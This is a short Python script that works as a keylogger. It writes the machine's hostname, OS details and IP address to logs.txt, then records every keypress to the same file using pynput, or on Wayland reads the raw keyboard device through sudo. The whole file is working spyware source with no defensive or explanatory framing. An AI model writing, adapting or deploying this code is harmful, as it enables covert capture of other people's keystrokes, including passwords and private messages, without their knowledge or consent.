from pynput import keyboard 
import os
import socket
import sys
import subprocess
import platform
import time
import threading

def get_host_info():
    host_info = os.uname()
    with open('logs.txt', 'a') as logs:
        logs.write(f"Host: {host_info.nodename}\n")
        logs.write(f"System: {host_info.sysname}\n")
        logs.write(f"Release: {host_info.release}\n")
        logs.write(f"Version: {host_info.version}\n")
        logs.write(f"Machine: {host_info.machine}\n")
        logs.write(f"host ip: {socket.gethostbyname(socket.gethostname())}\n")
        logs.write("\n")
    return platform.system()

def keylog_linux():
    device = "/dev/input/event0"
    print(f"Using device: {device}")
    process = subprocess.Popen(["sudo", "cat", device], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    for line in process.stdout:
        print(line.decode())


def keylog(key):
    print(str(key))
    with open('logs.txt', 'a') as logs:
        try:
            if key == keyboard.Key.enter:
                logs.write("\n")
            elif key == keyboard.Key.space:
                logs.write(" ")
            else:
                logs.write(key.char)
        except:
            print("skipi abdsami3")
            pass

            
if __name__ == "__main__":
    get_host_info()
    if platform.system() == "Linux":
        if os.environ.get("XDG_SESSION_TYPE") == "wayland":
            keylog_linux()
        else:
            listener = keyboard.Listener(on_press=keylog)
            listener.start()
            listener.join()
    
    input()

    
    
    



    
    
    
    
    


